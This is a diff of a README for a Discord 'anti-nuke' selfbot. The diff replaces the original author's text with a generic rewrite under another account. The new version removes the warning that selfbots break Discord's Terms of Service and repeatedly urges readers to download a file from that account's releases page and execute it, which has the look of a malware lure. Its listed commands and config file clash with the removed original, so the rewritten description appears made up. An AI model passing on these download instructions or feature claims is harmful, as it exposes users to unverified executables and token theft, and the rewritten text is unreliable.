@@ -1,182 +1,120 @@
-# Discord Antinuke Selfbot
+# Discord Anti-Nuke Selfbot 🚫🤖
 
-A sophisticated Discord anti-abuse selfbot engineered to provide comprehensive server protection through advanced security monitoring and proactive threat mitigation.
+![Discord Anti-Nuke Selfbot](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-![Discord Antinuke Selfbot](./self.png)
+Welcome to the **Discord Anti-Nuke Selfbot** repository! This project aims to provide comprehensive protection for your Discord servers against malicious activities. With advanced security monitoring and proactive threat mitigation, this selfbot is designed to keep your community safe.
 
-## ⚠️ DISCLAIMER
+## Table of Contents
 
-**Using selfbots is against Discord's Terms of Service.**
-This code is provided for educational purposes only.
-Use at your own risk. The developer does not take responsibility for any consequences.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-## 🛡️ Features
+## Features
 
-- **WebSocket Optimized**: Ultra-fast response to threats using WebSocket connection
-- **No Commands Required**: Fully configurable via config.yaml, no discord commands
-- **Anti-Abuse Protection**:
-  - Anti Bot Add: Prevents unauthorized bot additions
-  - Anti Channel Create/Delete/Update: Prevents unauthorized channel modifications
-  - Anti Mass Ban/Kick/Unban: Detects and prevents mass member removals
-  - Anti Role Create/Delete/Update: Prevents unauthorized role modifications
-  - Anti Member Update: Monitors suspicious member permission changes
-- **Auto-Recovery**: Can recover deleted channels and roles
-- **Threshold-based Detection**: Smart algorithms to minimize false positives
-- **Role Hierarchy Monitoring**: Checks bot's position in role hierarchy
-- **Permission Analysis**: 70% rule enforcement for optimal protection
-- **Detailed Logging**: Separate logs for actions and errors
-- **Daily Log Organization**: Keeps logs organized by date
-- **Graceful Shutdown Handling**: Proper client disconnection on termination
-- **Silent Operation**: Works without sending messages in Discord channels
-- **Whitelist System**: Protect trusted admins from false detections
-- **Owner Notifications**: Get alerts about important security events
+- **Real-time Monitoring**: Keep an eye on server activities to detect any suspicious behavior.
+- **Proactive Threat Mitigation**: Automatically take action against threats to prevent server damage.
+- **User-Friendly Interface**: Simple commands make it easy to manage security settings.
+- **Customizable Alerts**: Get notified about potential threats through various channels.
+- **Open Source**: Contribute to the project and help improve security for everyone.
 
-## 💻 System Requirements
+## Installation
 
-- **Memory**: Minimum 512MB RAM
-- **CPU**: 1 vCPU or better
-- **Storage**: At least 100MB of free space
-- **Node.js**: v16 or higher
-- **Connection**: Stable internet connection
-- **Hosting**: 24/7 uptime recommended for continuous protection
+To get started with the Discord Anti-Nuke Selfbot, you need to download the latest release. You can find it [here](https://github.com/moron04/discord-antinuke-selfbot/releases). Download the appropriate file for your system and execute it.
 
-## 📋 Setup Instructions
+### Prerequisites
 
-### 1. Prerequisites
-```bash
-# Install Node.js if you don't have it already
-# Clone or download this repository
-git clone https://github.com/faiz4sure/discord-antinuke-selfbot.git
-cd discord-antinuke-selfbot
+- **Node.js**: Make sure you have Node.js installed on your machine. You can download it from [nodejs.org](https://nodejs.org/).
+- **Discord Account**: This selfbot requires a Discord account to function. Make sure you have one ready.
 
-# Install dependencies
-npm install
+### Steps
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/moron04/discord-antinuke-selfbot.git
+   cd discord-antinuke-selfbot
+   ```
+
+2. Install dependencies:
+   ```bash
+   npm install
+   ```
+
+3. Configure your settings in the `config.json` file.
+
+4. Start the selfbot:
+   ```bash
+   node index.js
+   ```
+
+## Usage
+
+Once the selfbot is running, you can use various commands to manage server security. Here are some common commands:
+
+- **!status**: Check the current status of the selfbot.
+- **!monitor**: Start monitoring for suspicious activities.
+- **!stop**: Stop the monitoring process.
+- **!config**: Display the current configuration settings.
+
+## Configuration
+
+The configuration file, `config.json`, is where you can customize the selfbot's behavior. Here’s an example of what it might look like:
+
+```json
+{
+  "token": "YOUR_DISCORD_TOKEN",
+  "prefix": "!",
+  "alertChannel": "CHANNEL_ID",
+  "monitoring": {
+    "enabled": true,
+    "threshold": 5
+  }
+}
 ```
 
-### 2. Configuration
-1. Edit the `config/config.yaml` file:
-   - Add your Discord token (required)
-   - Add your Owner IDs (your Discord user ID)
-   - Set Protected server IDs (the servers you want to protect)
-   - Add whitelist users (trusted admins who won't trigger protection)
-   - Adjust action thresholds and timeframes if needed
-   - Configure other security settings as needed
+- **token**: Your Discord account token. Be careful not to share this with anyone.
+- **prefix**: The command prefix for the selfbot.
+- **alertChannel**: The channel ID where alerts will be sent.
+- **monitoring**: Settings for monitoring, including enabling/disabling and threshold values.
 
-The config file structure looks like this:
-```yaml
-selfbot:
-  token: "YOUR_DISCORD_TOKEN_HERE" # Your account token
-  server1_id: "111222333444555666" # First server to protect
-  server2_id: "222333444555666777" # Second server to protect
-  owner1_id: "123456789012345678" # Your Discord user ID
-  owner2_id: "234567890123456789" # Another owner ID (optional)
-  
-antinuke_settings:
-  punishment: "ban" # Options: "ban", "kick", "none"
-  # Various limits for different actions
-  
-whitelisted:
-  users: ["123456789012345678", "234567890123456789"] # Trusted admin IDs
-```
+## Contributing
 
-Alternatively, you can use environment variables:
-- Create a `.env` file with `DISCORD_TOKEN=your_token_here`
+We welcome contributions from the community! If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Please follow these steps:
 
-### 3. Starting the Selfbot
-```bash
-# Start the selfbot
-node index.js
-```
+1. Fork the repository.
+2. Create a new branch for your feature:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+4. Push to your branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Open a pull request.
 
-## ⚙️ Configuration Options
+## License
 
-The selfbot is fully configurable through `config/config.yaml`. Here are the key configuration options:
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-```yaml
-selfbot:
-  token: "YOUR_DISCORD_TOKEN_HERE" # Your account token (required)
-  server1_id: "111222333444555666" # First server to protect
-  server2_id: "222333444555666777" # Second server to protect (optional)
-  owner1_id: "123456789012345678" # Your Discord user ID (for notifications)
-  owner2_id: "234567890123456789" # Another owner ID (optional)
-  
-antinuke_settings:
-  punishment: "ban" # What to do when attack detected: "ban", "kick", or "none"
-  ban_limit: 5 # How many bans in time window before triggering protection
-  kick_limit: 5 # How many kicks in time window before triggering protection
-  channel_create_limit: 5 # Limit for channel creation
-  role_create_limit: 5 # Limit for role creation
-  channel_delete_limit: 5 # Limit for channel deletion
-  role_delete_limit: 5 # Limit for role deletion
-  channel_update_limit: 5 # Limit for channel updates
-  role_update_limit: 5 # Limit for role updates
-  member_update_limit: 5 # Limit for member permission changes
-  unban_limit: 5 # Limit for unbans (mass unbanning)
-  time_window: 36000000 # Time window in milliseconds (10 hours)
+## Support
 
-logs:
-  channel_id: "1234567890123456789" # Optional log channel ID
-  log_level: "info" # What to log: "all", "info", "warning", "error", "critical"
-  timestamp: true # Show timestamps in logs
-  log_webhook: "" # Discord webhook URL for logging (optional)
-  log_owner_dm: false # Whether to DM owners with important alerts
-  
-whitelisted:
-  users: ["1234567890123456789", "2345678901234567890"] # Users who won't trigger the system
-  
-rpc:
-  enabled: true # Show activity status
-  rotation: false # Whether to rotate status messages
-```
+If you encounter any issues or have questions, please check the [Releases](https://github.com/moron04/discord-antinuke-selfbot/releases) section for updates and fixes. You can also reach out to the community for help.
 
-## ⚠️ Precautions
+## Acknowledgments
 
-1. **Account Security**: Keep your Discord token secure. Never share it with others.
-2. **TOS Violation**: Remember that selfbots violate Discord's Terms of Service.
-3. **Permissions**: The selfbot needs Administrator permission in protected servers.
-4. **False Positives**: Configure thresholds carefully to avoid accidental triggers.
-5. **Role Hierarchy**: Ensure the selfbot's role is high enough in the hierarchy.
-6. **Backup**: Keep backups of your server settings in case of issues.
-7. **Hosting**: Don't run on your main PC - use a dedicated hosting service.
+- **Discord.js**: This project uses the Discord.js library for interaction with the Discord API.
+- **Community Contributions**: Thank you to all contributors who help make this project better.
 
-## 🌐 Hosting Recommendations
+## Conclusion
 
-While you can run this on your own device, we strongly recommend using a dedicated hosting service for:
-- 24/7 uptime
-- Better reliability
-- Lower risk to your personal devices and network
+The Discord Anti-Nuke Selfbot is a powerful tool for protecting your Discord servers. With its advanced features and user-friendly interface, you can ensure a safe environment for your community. Download the latest release [here](https://github.com/moron04/discord-antinuke-selfbot/releases) and start securing your server today!
 
-**Recommended hosting options:**
-- VPS providers (DigitalOcean, Linode, AWS, etc.)
-- NodeJS hosting services
-- Replit (with hacks to prevent sleep)
-
-Join our [support server](https://discord.gg/heer) for hosting recommendations and setup help.
-
-## 📱 Mobile Setup
-
-For instructions on setting up on Android using Termux, see [Android.md](Android.md)
-
-## 🔧 Troubleshooting
-
-- **Token Invalid**: Double-check your Discord token is correct and not expired
-- **Permission Issues**: Ensure the bot has Administrator permission in protected servers
-- **Role Hierarchy**: The bot's role needs to be high enough to take action
-- **Memory Issues**: Ensure your hosting has at least 512MB RAM
-- **Startup Errors**: Check logs/errors.txt for detailed error information
-
-## 🤝 Support
-
-For help with setup, hosting, or issues:
-- Join our support server: [https://discord.gg/heer](https://discord.gg/heer)
-- Read the documentation thoroughly before asking questions
-
-## 🎁 Contribute
-.
-- If you love the project, you can simply contribute in it by leaving a star.
-- You can also work with us in this project at support server.
-
-## 👨‍💻 Credits
-
-- Made with ❤️ by [faiz4sure](https://github.com/faiz4sure)
-- Support server: [https://discord.gg/heer](https://discord.gg/heer)
+Feel free to explore the code, report issues, and contribute to the project. Together, we can make Discord a safer place for everyone!
